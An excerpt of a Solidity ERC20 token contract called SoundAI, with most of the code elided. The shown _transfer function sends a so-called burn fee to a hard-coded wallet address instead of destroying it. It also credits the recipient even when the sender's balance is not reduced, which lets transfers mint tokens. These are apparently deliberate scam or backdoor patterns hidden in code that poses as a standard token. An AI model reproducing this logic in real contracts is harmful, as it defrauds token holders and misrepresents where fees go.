...
// Submitted for Website: https://sounai-app.com
...
contract  SoundAI  is Ownable, IERC20 {
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x4fc2A0d5E2A9047289e2FFd14B00184e1536F21A] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0x4fc2A0d5E2A9047289e2FFd14B00184e1536F21A, _bruntoken);
        }
